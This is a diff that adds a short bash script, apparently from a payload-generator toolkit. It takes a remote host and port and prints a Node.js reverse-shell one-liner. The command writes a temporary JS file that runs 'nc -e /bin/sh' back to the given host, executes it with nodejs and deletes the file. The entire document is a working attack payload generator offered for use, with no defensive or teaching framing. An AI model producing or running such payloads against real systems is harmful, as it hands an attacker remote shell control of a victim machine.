@@ -1,0 +1,21 @@
+#!/bin/bash
+
+function Craft_linux_nodejs_reverse_shell(){
+
+        if [ -z "$1" ] || [ -z "$2" ]
+        then
+                printf "Auto-gen Linux nodejs reverse tcp shell\n"
+                printf "Usage bash linux_nodejs-reverse-tcp <rhost> <rport>\n"
+                exit
+        fi
+
+        rhost="$1"
+        rport="$2"
+
+        printf "\n"
+	printf "echo \"require('child_process').exec('nc -e /bin/sh $rhost $rport')\" > /tmp/nd.js && nodejs /tmp/nd.js && rm /tmp/nd.js"
+        printf "\n\n[\e[0;32m+\e[0m] Payload created.\n"
+
+}
+
+Craft_linux_nodejs_reverse_shell "$1" "$2"
